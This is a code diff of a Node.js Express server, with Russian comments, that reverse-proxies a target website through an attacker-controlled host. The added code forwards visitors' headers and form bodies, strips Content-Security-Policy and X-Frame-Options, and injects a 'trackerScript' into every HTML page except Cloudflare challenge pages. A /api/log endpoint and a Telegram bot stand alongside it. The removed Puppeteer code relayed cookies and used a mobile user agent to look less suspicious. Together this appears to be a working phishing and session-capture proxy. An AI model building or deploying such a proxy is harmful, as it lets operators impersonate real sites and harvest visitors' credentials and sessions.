@@ -161,17 +161,23 @@ const trackerScript = `
 </script>
 `;
 
-// Проксируем Cloudflare CDN запросы
-app.use('/cdn-cgi', async (req, res) => {
-  const cdnUrl = TARGET_SITE + req.originalUrl;
-  console.log('Proxying CDN:', cdnUrl);
+// Простой HTTP прокси для всех запросов (кроме /api/log)
+app.use((req, res, next) => {
+  // Пропускаем API логирования
+  if (req.path === '/api/log') {
+    return next();
+  }
+  
+  const https = require('https');
+  const http = require('http');
+  const urlModule = require('url');
+  const zlib = require('zlib');
+  
+  const targetUrl = TARGET_SITE + req.url;
+  console.log('Proxying:', req.method, targetUrl);
   
   try {
-    const https = require('https');
-    const http = require('http');
-    const urlModule = require('url');
-    
-    const parsedUrl = urlModule.parse(cdnUrl);
+    const parsedUrl = urlModule.parse(targetUrl);
     const protocol = parsedUrl.protocol === 'https:' ? https : http;
     
     const options = {
@@ -180,30 +186,103 @@ app.use('/cdn-cgi', async (req, res) => {
       path: parsedUrl.path,
       method: req.method,
       headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Accept': req.headers.accept || '*/*',
-        'Referer': TARGET_SITE
+        ...req.headers,
+        host: parsedUrl.hostname,
+        'accept-encoding': 'gzip, deflate'
       }
     };
     
+    // Убираем заголовки которые могут сломать прокси
+    delete options.headers['host'];
+    delete options.headers['connection'];
+    
     const proxyReq = protocol.request(options, (proxyRes) => {
-      res.writeHead(proxyRes.statusCode, proxyRes.headers);
-      proxyRes.pipe(res);
+      const contentType = proxyRes.headers['content-type'] || '';
+      const isHtml = contentType.includes('text/html');
+      
+      // Для HTML обрабатываем
+      if (isHtml) {
+        let chunks = [];
+        let stream = proxyRes;
+        
+        // Распаковываем если gzip
+        if (proxyRes.headers['content-encoding'] === 'gzip') {
+          stream = proxyRes.pipe(zlib.createGunzip());
+        } else if (proxyRes.headers['content-encoding'] === 'deflate') {
+          stream = proxyRes.pipe(zlib.createInflate());
+        }
+        
+        stream.on('data', chunk => chunks.push(chunk));
+        stream.on('end', () => {
+          let html = Buffer.concat(chunks).toString('utf-8');
+          
+          // Добавляем base tag
+          const baseUrl = new URL(TARGET_SITE);
+          if (html.includes('<head>')) {
+            html = html.replace('<head>', `<head>\n<base href="${baseUrl.origin}/">`);
+          }
+          
+          // Проверяем Cloudflare
+          const isCloudflare = html.includes('cf-challenge') || 
+                               html.includes('Just a moment') || 
+                               html.includes('Verify you are human');
+          
+          console.log('Is Cloudflare:', isCloudflare);
+          
+          // Внедряем трекер только если НЕ Cloudflare
+          if (!isCloudflare) {
+            if (html.includes('</body>')) {
+              html = html.replace('</body>', trackerScript + '</body>');
+            }
+          }
+          
+          // Убираем проблемные заголовки
+          const headers = { ...proxyRes.headers };
+          delete headers['content-security-policy'];
+          delete headers['x-frame-options'];
+          delete headers['content-encoding'];
+          headers['content-length'] = Buffer.byteLength(html);
+          
+          res.writeHead(proxyRes.statusCode, headers);
+          res.end(html);
+        });
+        
+        stream.on('error', (err) => {
+          console.error('Stream error:', err);
+          res.status(500).send('Error processing response');
+        });
+        
+      } else {
+        // Для не-HTML просто передаём как есть
+        res.writeHead(proxyRes.statusCode, proxyRes.headers);
+        proxyRes.pipe(res);
+      }
     });
     
     proxyReq.on('error', (err) => {
-      console.error('CDN proxy error:', err);
-      res.status(500).send('CDN Error');
+      console.error('Proxy error:', err);
+      if (!res.headersSent) {
+        res.status(500).send(`
+          <html><body style="font-family:sans-serif;padding:20px;">
+            <h2>❌ Ошибка загрузки</h2>
+            <p>${err.message}</p>
+          </body></html>
+        `);
+      }
     });
     
-    if (req.method === 'POST') {
+    // Передаём тело запроса
+    if (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH') {
       req.pipe(proxyReq);
     } else {
       proxyReq.end();
     }
+    
   } catch (err) {
-    console.error('CDN error:', err);
-    res.status(500).send('Error');
+    console.error('Error:', err);
+    if (!res.headersSent) {
+      res.status(500).send('Error');
+    }
   }
 });
 
@@ -235,87 +314,7 @@ app.post('/api/log', async (req, res) => {
   }
 });
 
-// Прокси через Puppeteer
-app.get('*', async (req, res) => {
-  const url = TARGET_SITE + req.path + (req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '');
-  console.log('Fetching:', url);
-  
-  let page = null;
-  try {
-    const br = await getBrowser();
-    page = await br.newPage();
-    
-    page.setDefaultTimeout(30000);
-    page.setDefaultNavigationTimeout(30000);
-    
-    // Мобильный User-Agent для меньшей подозрительности
-    await page.setUserAgent('Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1');
-    await page.setViewport({ width: 390, height: 844 });
-    
-    // Устанавливаем cookies если есть
-    if (req.headers.cookie) {
-      const cookies = req.headers.cookie.split(';').map(c => {
-        const [name, ...rest] = c.trim().split('=');
-        return { name, value: rest.join('='), domain: new URL(TARGET_SITE).hostname };
-      });
-      await page.setCookie(...cookies);
-    }
-    
-    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 });
-    await page.waitForTimeout(2000);
-    
-    let html = await page.content();
-    
-    // Получаем cookies после загрузки
-    const pageCookies = await page.cookies();
-    
-    // Добавляем base tag
-    const baseUrl = new URL(TARGET_SITE);
-    if (html.includes('<head>')) {
-      html = html.replace('<head>', `<head>\n<base href="${baseUrl.origin}/">`);
-    }
-    
-    // Проверяем Cloudflare
-    const isCloudflare = html.includes('cf-challenge') || 
-                         html.includes('Just a moment') || 
-                         html.includes('Verify you are human');
-    
-    // Внедряем трекер только если НЕ Cloudflare
-    if (!isCloudflare) {
-      if (html.includes('</body>')) {
-        html = html.replace('</body>', trackerScript + '</body>');
-      } else {
-        html += trackerScript;
-      }
-    }
-    
-    // Устанавливаем cookies в ответ
-    pageCookies.forEach(cookie => {
-      res.cookie(cookie.name, cookie.value, {
-        domain: cookie.domain,
-        path: cookie.path,
-        expires: cookie.expires > 0 ? new Date(cookie.expires * 1000) : undefined,
-        httpOnly: cookie.httpOnly,
-        secure: cookie.secure,
-        sameSite: cookie.sameSite || 'lax'
-      });
-    });
-    
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    res.send(html);
-    
-  } catch (err) {
-    console.error('Error:', err.message);
-    res.status(500).send(`
-      <html><body style="font-family:sans-serif;padding:20px;">
-        <h2>❌ Ошибка загрузки</h2>
-        <p>${err.message}</p>
-      </body></html>
-    `);
-  } finally {
-    if (page) await page.close().catch(() => {});
-  }
-});
+
 
 // Команды бота
 bot.onText(/\/start/, (msg) => {
